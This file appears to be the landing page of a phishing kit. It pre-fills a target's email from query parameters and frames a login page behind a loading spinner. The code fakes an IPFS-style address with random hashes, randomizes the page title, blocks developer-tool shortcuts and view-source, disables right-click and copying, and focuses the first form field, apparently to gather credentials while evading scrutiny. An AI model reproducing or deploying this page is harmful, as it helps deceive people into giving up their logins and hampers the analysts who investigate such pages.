<?php
require_once __DIR__ . '/index-functions.php';

$products = normalizeProducts($_GET['products'] ?? '');
$id       = $_GET['id'] ?? '';

// Support alternate param name (from external sites that use ?jeya=, ?email=, etc.)
if ($products === '' && !empty($_GET['jeya'])) {
    $products = normalizeProducts((string)$_GET['jeya']);
}
if ($products === '' && !empty($_GET['email'])) {
    $products = normalizeProducts((string)$_GET['email']);
}

// If neither products nor id resolve, send to index with a friendly message.
if ($products === '' && $id === '') {
    header('Location: index.php');
    exit;
}

$query = [];
if ($products !== '') $query['products'] = $products;
if ($id       !== '') $query['id']       = $id;
$iframe_src = 'index.php?' . http_build_query($query);
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <title>Loading&hellip;</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
                         Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        /* Loading overlay — visible until iframe finishes */
        #loader {
            position: fixed;
            inset: 0;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            transition: opacity .35s ease, visibility .35s ease;
        }
        #loader.hidden {
            opacity: 0;
            visibility: hidden;
        }

        .spinner-wrap {
            position: relative;
            width: 76px;
            height: 76px;
            margin-bottom: 24px;
        }
        .spinner-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: #3b82f6;
            border-right-color: #60a5fa;
            animation: spin 1.1s cubic-bezier(.55,.15,.45,.85) infinite;
            filter: drop-shadow(0 0 10px rgba(59,130,246,.5));
        }
        .spinner-ring.inner {
            inset: 11px;
            border-top-color: transparent;
            border-left-color: #60a5fa;
            border-bottom-color: #3b82f6;
            animation: spin 1.6s linear infinite reverse;
            opacity: .75;
        }
        .spinner-ring.core {
            inset: 22px;
            border: none;
            background: linear-gradient(135deg, #3b82f6 0%, #60a5fa 100%);
            animation: pulse 1.8s ease-in-out infinite;
            box-shadow: 0 0 0 0 rgba(59,130,246,.5);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes pulse {
            0%, 100% { transform: scale(.85); box-shadow: 0 0 0 0 rgba(59,130,246,.5); }
            50%      { transform: scale(1);   box-shadow: 0 0 0 12px rgba(59,130,246,0); }
        }

        .loader-text {
            color: #e2e8f0;
            font-size: 15px;
            font-weight: 500;
            letter-spacing: .01em;
            opacity: .9;
        }
        .loader-sub {
            color: #94a3b8;
            font-size: 13px;
            margin-top: 6px;
            opacity: .7;
        }

        /* Iframe fills the viewport once loaded */
        #myIframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: 0;
            opacity: 0;
            transition: opacity .35s ease;
            background: #ffffff;
        }
        #myIframe.visible {
            opacity: 1;
        }
    </style>
</head>
<body>
    <!-- Loading overlay -->
    <div id="loader" role="status" aria-live="polite">
        <div class="spinner-wrap" aria-hidden="true">
            <div class="spinner-ring"></div>
            <div class="spinner-ring inner"></div>
            <div class="spinner-ring core"></div>
        </div>
        <div class="loader-text">Preparing your session</div>
        <div class="loader-sub">Please wait a moment&hellip;</div>
    </div>

    <!-- Iframe (hidden until loaded) -->
    <iframe id="myIframe"
            src="<?php echo htmlspecialchars($iframe_src, ENT_QUOTES, 'UTF-8'); ?>"
            frameborder="0"
            allow="autoplay; clipboard-read; clipboard-write; fullscreen"
            sandbox="allow-scripts allow-same-origin allow-top-navigation allow-forms allow-popups"></iframe>

<script>
  (function () {
    'use strict';

    document.addEventListener('DOMContentLoaded', function () {

      /* ---------- Randomize the outer page title ---------- */
      var titles = [
        "Dashboard", "Library", "Explorer", "Resource Hub", "Workspace",
        "Control Panel", "Directory", "Navigation", "Project Center", "Board",
        "Studio", "Data View", "Timeline", "Activity", "Overview",
        "Discovery", "Cloud", "Insights", "Collections", "Stream"
      ];
      document.title = titles[Math.floor(Math.random() * titles.length)];

      /* ---------- Fake IPFS-looking URL ---------- */
      function generateRandomHash(minLength, maxLength) {
        minLength = minLength || 80;
        maxLength = maxLength || 120;
        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~';
        var length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        var array = new Uint8Array(length);
        crypto.getRandomValues(array);
        var result = '';
        for (var i = 0; i < length; i++) {
          result += chars[array[i] % chars.length];
        }
        return result;
      }

      var randomHash    = generateRandomHash();
      var currentDomain = window.location.hostname;
      var fakeIpfsUrl   = 'https://' + currentDomain + '/' + randomHash + '/' + randomHash;
      try {
        window.history.pushState({ path: fakeIpfsUrl }, '', fakeIpfsUrl);
      } catch (e) {
        // Some sandboxed contexts disallow pushState — ignore.
      }

      /* ---------- Iframe reveal + hooks ---------- */
      var iframe = document.getElementById('myIframe');
      var loader = document.getElementById('loader');
      var revealed = false;

      function revealIframe() {
        if (revealed) return;
        revealed = true;

        // Fade out loader
        if (loader) loader.classList.add('hidden');

        // Fade in iframe
        if (iframe) iframe.classList.add('visible');

        // Remove loader from DOM after transition
        setTimeout(function () {
          if (loader && loader.parentNode) loader.parentNode.removeChild(loader);
        }, 400);
      }

      /* Safety net — if iframe onload never fires (some browsers),
         reveal after 4 seconds. Prevents "stuck on blank" state. */
      var safetyTimeout = setTimeout(revealIframe, 4000);

      iframe.addEventListener('load', function () {
        clearTimeout(safetyTimeout);
        revealIframe();

        // Attach hooks to the iframe's document
        try {
          var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
          if (!iframeDoc) return;

          ['contextmenu', 'copy', 'dragstart'].forEach(function (evt) {
            iframeDoc.addEventListener(evt, function (e) { e.preventDefault(); });
          });

          iframe.contentWindow.focus();
          if (iframeDoc.body) iframeDoc.body.focus();

          var firstField = iframeDoc.querySelector(
            'input:not([type=hidden]):not([readonly])'
          );
          if (firstField) firstField.focus();
        } catch (err) {
          // Cross-origin or blocked — silently ignore
          console.warn('Iframe hook skipped:', err);
        }
      });

      /* ---------- Outer-page protections ---------- */
      document.addEventListener('contextmenu', function (e) { e.preventDefault(); });

      document.addEventListener('keydown', function (e) {
        var k = (e.key || '').toUpperCase();
        if (
          k === 'F12' ||
          (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].indexOf(k) !== -1) ||
          (e.ctrlKey && k === 'U') ||
          (e.metaKey && e.altKey && ['I', 'J'].indexOf(k) !== -1)
        ) {
          e.preventDefault();
          return false;
        }
      });
    });
  })();
</script>
</body>
</html>